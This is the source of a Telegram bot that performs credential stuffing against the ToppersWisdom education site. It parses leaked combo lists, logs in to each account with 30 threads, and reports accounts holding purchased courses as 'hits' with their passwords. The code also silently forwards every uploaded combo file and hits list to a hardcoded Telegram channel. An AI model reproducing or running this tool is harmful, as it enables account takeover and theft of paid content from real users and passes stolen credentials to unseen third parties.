import requests
import os
import time
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

# ==============================================================================
# SUPER ROBUST PARSER (Koi bhi valid combo miss nahi hoga)
# ==============================================================================
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Support both '*' and ':' as separators
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        # Clean up username (remove leading garbage if any)
        if " " in username:
            username = username.split()[-1]
        
        # Remove +91 prefix if present
        if username.startswith('+91'):
            username = username[3:]
        
        # If it's a long number, take only the last 10 digits (phone number)
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        
        # Ignore garbage lines (URLs, user agents, etc.)
        if username.lower().startswith(('http', 'android', 'com.', 'www.', 'mozilla', 'accept')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "topper"
    name = "ToppersWisdom"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Smart Parse:</b> ':', '*', '+91', aur multiple formats auto-handle honge. Koi combo miss nahi hoga!\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>Purchased (is_buy == 1)</b> courses wale accounts HIT honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        
        # ✅ Original filename aur temp path setup
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'no_batch': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        # ✅ original_file_name bhi pass karo
        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30  # Ultra-fast speed
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30  # 30 workers * 30 = har 1-2 second mein progress update!
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    elif result['status'] == 'no_batch':
                        stats['no_batch'] += 1
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Purchased Hits: {stats['hits']}\n"
                    f"⚠️ No Batch: {stats['no_batch']}\n"
                    f"❌ Failed: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'no_batch': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        
        # ✅ APP NAME se filename banao (e.g., "ToppersWisdom.txt")
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Purchased Hits: {stats['hits']}\n⚠️ No Batch: {stats['no_batch']}\n❌ Failed: {stats['failed']}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Purchased Hits: {stats['hits']}\n⚠️ No Batch: {stats['no_batch']}\n❌ Failed: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            # ✅ CHANGE 1: Live progress message ko delete kar do
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ CHANGE 2: User ko sirf Hits file bhejo (Filename: ToppersWisdom.txt)
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ CHANGE 3: Channel me DONO files bhejo
            try:
                # 1. Original File to Channel (Filename: ToppersWisdom.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: ToppersWisdom.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            # No hits: notify user (NO file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Purchased Hit nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        # ✅ Temporary input file delete karo (End mein)
        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        # ✅ ROBUST PARSER CALL
        parsed = parse_combo(line)
        if not parsed:
            return {'status': 'failed'}
        
        email, password = parsed

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36',
            'Origin': 'https://www.topperswisdom.com',
            'Referer': 'https://www.topperswisdom.com/'
        }

        login_url = 'https://node.topperswisdom.com/api/users/login'
        login_payload = {
            "email": email.strip(),
            "password": password.strip(),
            "mobile": "",
            "otp": "",
            "logged_in_via": "web",
            "customer_id": 695
        }
        
        session = requests.Session()
        try:
            res = session.post(login_url, json=login_payload, headers=headers, timeout=10)
            data = res.json()

            if data.get("state") == 401 or "Invalid" in data.get("msg", ""):
                return {'status': 'failed'}

            # Extract user_id (note the underscore) from login response
            user_data = data.get("data", {})
            user_id = user_data.get("user_id")
            
            if not user_id:
                return {'status': 'failed'}

            # 2. Fetch Courses Request
            courses_url = 'https://node.topperswisdom.com/api/courses/my-courses'
            res_c = session.post(courses_url, json={"userId": user_id}, headers=headers, timeout=10)
            c_data = res_c.json()

            if c_data.get("state") != 200:
                return {'status': 'failed'}

            # Parse live and recorded courses
            active_courses = []
            for group in c_data.get("data", []):
                for course_type in ["liveCourses", "recordedCourses"]:
                    for course in group.get(course_type, []):
                        # ✅ STRICT FILTER: Sirf Purchased (is_buy == 1) courses ko HIT maano
                        if course.get("is_buy") == 1:
                            title = course.get("title", "Unknown Course")
                            active_courses.append(title)

            # ✅ FINAL CHECK: Sirf tab HIT jab purchased courses > 0
            if active_courses:
                hit_text = "--------------------------------------------------\n"
                hit_text += f"🔐 Credentials: {email}:{password}\n"
                hit_text += f"🆔 User ID: {user_id}\n"
                hit_text += f"📚 Purchased Courses ({len(active_courses)}):\n"
                for idx, title in enumerate(active_courses, 1):
                    hit_text += f"   ∟ {idx}. {title}\n"
                hit_text += "--------------------------------------------------"
                return {'status': 'hit', 'data': hit_text}
            else:
                # Login success lekin koi purchased course nahi
                return {'status': 'no_batch'}

        except Exception:
            return {'status': 'failed'}
        finally:
            session.close()
